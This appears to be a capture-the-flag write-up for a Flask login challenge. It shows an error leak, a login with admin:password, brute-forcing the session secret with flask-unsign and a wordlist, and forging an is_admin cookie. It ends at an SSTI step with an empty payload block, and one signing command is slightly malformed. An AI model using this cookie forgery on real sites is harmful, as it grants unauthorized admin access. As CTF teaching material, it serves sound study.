## About the Challenge
We were given a website (Without source code) and there is a login page in this website

## How to Solve?
If you check the HTTP response header, this website using Python and Werkzeug.

![header](images/header.png)

And now I tried to make the website error to know what is the response. In this case I made the website error by removing `password` parameter when hitting `/login` endpoint

Hmmm there is an interesting code here especially in the `elif` part. Lets try to login using `admin:password` credential

![user](images/user.png)

Yay, we can login but as an `user`? Let's check the cookie value

![cookie](images/cookie.png)

This website was using flask for Session-based auth. And because of this website using flask, we can bruteforce the secret key and changed the value of the cookie.

```bash
root@root:~$ flask-unsign --unsign --cookie ".eJyrVsosjk9Myc3MU7JKS8wpTtVRKi1OLYrPTFGyUjI0M1KC8PMSc1OBAhCFtQDj5xGP.ZM5ITg.NrGKbBGCkxPIk0iQLQE2Cuc2cGc" --wordlist /home/daffainfo/tools/rockyou.txt  --no-literal-eval
[*] Session decodes to: {'is_admin': False, 'user_id': '162', 'username': 'admin'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 30080 attempts
b'amorlove'
```

We got `amorlove`. And now tried to change the value of `is_admin` from `False` to `True`. Sign the cookie again using `flask-unsign`

```bash
root@root:~$ flask-unsign --sign --cookie "{'is_admin': True, 'user_id': '162', 'username': 'admin'" --secret 'amo
rlove'

```

Use the cookie to access `/user` endpoint again and as you can see the the privilege was changed from `user` to `admin`. Now go to `/dashboard` and you will find another form that vulnerable SSTI. In the end the payload was something like this

```
